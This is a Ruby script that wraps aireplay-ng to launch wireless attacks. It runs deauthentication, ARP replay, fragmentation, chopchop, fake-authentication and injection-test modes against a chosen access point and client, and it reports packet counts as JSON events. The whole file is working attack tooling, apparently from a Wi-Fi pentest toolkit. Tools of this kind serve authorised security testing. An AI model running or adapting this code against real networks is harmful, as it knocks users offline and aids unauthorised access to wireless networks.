#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'

ATTACK_TYPES = %w[deauth arp-replay frag chopchop test fake-auth].freeze

def emit(event, iface, bssid, ssid, channel, data)
  puts JSON.generate(event: event, iface: iface, bssid: bssid, ssid: ssid, channel: channel, data: data, timestamp: Time.now.iso8601)
  $stdout.flush
end

def build_attack_cmd(attack_type, iface, bssid, station, count)
  aireplay = `which aireplay-ng 2>/dev/null`.strip
  return nil if aireplay.empty?

  case attack_type
  when 'deauth'
    [aireplay, '--deauth', count.to_s, '-a', bssid, '-c', station, iface]
  when 'arp-replay'
    [aireplay, '--arpreplay', '-b', bssid, '-h', station, iface]
  when 'frag'
    [aireplay, '--fragment', '-b', bssid, '-h', station, iface]
  when 'chopchop'
    [aireplay, '--chopchop', '-b', bssid, '-h', station, iface]
  when 'test'
    [aireplay, '--test', iface]
  when 'fake-auth'
    [aireplay, '--fakeauth', count.to_s, '-a', bssid, '-h', station, iface]
  end
end

begin
  iface = ARGV[0]
  attack_type = ARGV[1]
  bssid = ARGV[2] || ''
  station = ARGV[3] || 'AA:BB:CC:DD:EE:FF'
  count = (ARGV[4] || '1').to_i

  raise 'interface required' unless iface
  raise "attack_type required; one of #{ATTACK_TYPES.join(', ')}" unless attack_type && ATTACK_TYPES.include?(attack_type)

  emit('aireplay_start', iface, bssid, '', 0, { attack_type: attack_type, station: station, count: count })

  cmd = build_attack_cmd(attack_type, iface, bssid, station, count)
  raise 'aireplay-ng not found' unless cmd

  emit('aireplay_launch', iface, bssid, '', 0, { command: cmd.join(' ') })

  Open3.popen3(*cmd) do |stdin, stdout, stderr, thread|
    stdin.close
    readers = [stdout, stderr]
    packets_sent = 0

    until readers.empty?
      ready = IO.select(readers, nil, nil, 0.5)
      if ready
        ready[0].each do |r|
          begin
            line = r.gets
            if line
              line.force_encoding('UTF-8')
              if line =~ /Sent (\d+) (packets|management)/
                packets_sent = $1.to_i
              end
              emit('aireplay_output', iface, bssid, '', 0, { attack_type: attack_type, line: line.strip, packets_sent: packets_sent })
            else
              readers.delete(r)
            end
          rescue Errno::EINTR
            next
          end
        end
      end
    end

    thread.join
    exit_code = thread.value.exitstatus

    emit('aireplay_complete', iface, bssid, '', 0, { attack_type: attack_type, packets_sent: packets_sent, exit_code: exit_code })
  end

rescue Interrupt
  emit('aireplay_interrupted', iface || '', bssid || '', '', 0, {})
rescue => e
  $stderr.puts JSON.generate(event: 'error', data: { message: e.message, backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601)
  exit 1
end
